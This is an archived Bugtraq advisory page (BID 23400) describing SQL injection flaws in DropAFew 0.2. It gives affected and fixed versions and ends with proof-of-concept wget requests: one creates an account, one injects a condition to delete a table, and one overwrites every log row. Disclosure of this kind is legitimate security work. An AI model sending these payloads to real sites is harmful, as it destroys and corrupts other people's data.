@@ -1,0 +1,101 @@
+#SpeeDr00t@Black Falcon<br>#bid23400<p><b><span style="font-size: 18pt;">DropAFew Multiple SQL Injection Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/23400/info">info</a><br><a href="http://www.securityfocus.com/bid/23400/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/23400/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/23400/solution">solution</a><br><a href="http://www.securityfocus.com/bid/23400/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				23400
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2007-1364<br/>
+				
+					CVE-2007-1363<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Apr 10 2007 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 06 2016 02:39PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Alexander Klink is credited with the discovery of these vulnerabilities.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					DropAFew DropAFew  0.2<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					DropAFew DropAFew 0.2.1 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can use a browser to exploit these issues.<br/><br/>The following proof-of-concept URIs are available:<br/> <br/># create new user<br/>wget --save-cookies cookies --keep-session-cookies --post-data='username=exploit&amp;amp;password=1&amp;amp;password_confirm=1' http://target/calorie/newaccount2.php<br/><br/># delete foodfacts table<br/>wget --load-cookies cookies --post-data='id=1%20OR%20id%20&amp;gt;%200--&amp;amp;action=del' http://target/calorie/search.php<br/><br/># make everyone have eaten 1000 strawberries, but hey, they were only 10<br/><br/># calories ...<br/>wget --load-cookies cookies --post-data='action=save&amp;amp;id=1&amp;amp;date=20070101&amp;amp;time=23232323&amp;amp;vendor=nature&amp;amp;item=strawberries&amp;amp;portion=1000&amp;amp;calories=10+WHERE+id+%3E+0+%2F*'<br/>http://target/calorie/editlogcal.php
+	
+		<ul>
+</ul>
+</div>
